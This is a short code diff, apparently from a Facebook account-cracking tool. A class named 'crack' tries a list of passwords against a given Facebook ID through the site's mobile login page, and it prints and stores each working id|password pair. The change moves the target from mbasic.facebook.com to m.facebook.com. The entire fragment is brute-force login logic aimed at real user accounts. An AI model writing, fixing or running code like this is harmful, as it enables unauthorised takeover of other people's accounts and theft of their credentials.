@@ -512,7 +512,7 @@ class crack:
 		try:
 			for i in fl.get("pw"):
 				log=login(fl.get("id"),
-					i,"https://mbasic.facebook.com")
+					i,"https://m.facebook.com")
 				if log.get("status")=="success":
 					print(G+"\r++ %s|%s ----> OK%s      "%(fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
